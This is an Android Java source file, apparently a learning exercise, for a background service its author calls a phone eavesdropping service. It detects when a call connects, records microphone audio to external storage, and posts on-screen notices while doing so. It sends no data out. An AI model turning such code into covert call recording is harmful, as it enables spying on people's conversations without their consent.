package com.lanying.phoneeavesdropper;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by lanying on 2016/11/17.
 * 在后台执行录音操作
 */
public class PhoneEavesdropService extends Service {
    private TelephonyManager mTelephonyManager;
    private MediaRecorder mRecorder;
    private File dst;// 录音保存的文件

    @Override
    public void onCreate() {
        super.onCreate();

        // 创建电话管理器对象
        mTelephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

        // 创建监听器对象
        PhoneStateListener listener = new PhoneStateListener(){
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber/*来电号码*/);
                switch(state){
                    case  TelephonyManager.CALL_STATE_IDLE:// 空闲、挂断
                        stopRecord();
                        break;
                    case TelephonyManager.CALL_STATE_RINGING:// 响铃
                        Toast.makeText(PhoneEavesdropService.this, "incomingNumber = "+incomingNumber, Toast.LENGTH_SHORT).show();
                        // 去电，比较尴尬
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:// 通话
                        startRecord();
                        break;
                }

            }

        };

        // 设置监听
        mTelephonyManager.listen(listener,PhoneStateListener.LISTEN_CALL_STATE/*具体监听的内容*/);

        Toast.makeText(PhoneEavesdropService.this, "电话窃听服务开启成功", Toast.LENGTH_SHORT).show();
    }

    private void prepare(){
        // 照抄SDK帮助文档
        try {
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setOutputFile(dst.getAbsolutePath());
            //mRecorder.setOutputFile("sdcard/record_1117.mp3");
            mRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    /**
     * 开始录音
     */
    private void startRecord() {
        // 显示不可用
        if(Environment.getExternalStorageState() != Environment.MEDIA_MOUNTED){
            Toast.makeText(PhoneEavesdropService.this, "我要窃听电话，但SD卡不可用，无视", Toast.LENGTH_SHORT).show();
            //return ;
        }

        // 保存到内部存储空间，验证可用
        //dst = new File(this.getExternalFilesDir(null),new SimpleDateFormat("yyyyMMddHHmmss").format(new Date())+"_record.mp3");

        // 保存到外部存储空间，验证可用
        dst = new File(Environment.getExternalStorageDirectory(),new SimpleDateFormat("yyyyMMddHHmmss").format(new Date())+"_record.mp3");
        Log.d("lanying",Environment.getExternalStorageDirectory().getAbsolutePath());

        prepare();
        mRecorder.start();   // Recording is now started
        Toast.makeText(PhoneEavesdropService.this, "开始录音", Toast.LENGTH_SHORT).show();
    }


    /**
     * 停止录音
     */
    private void stopRecord() {
        if(mRecorder != null){
            // 挂断
            mRecorder.stop();
            mRecorder.release();
            mRecorder = null;
            Toast.makeText(PhoneEavesdropService.this, "录音完毕", Toast.LENGTH_SHORT).show();

        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
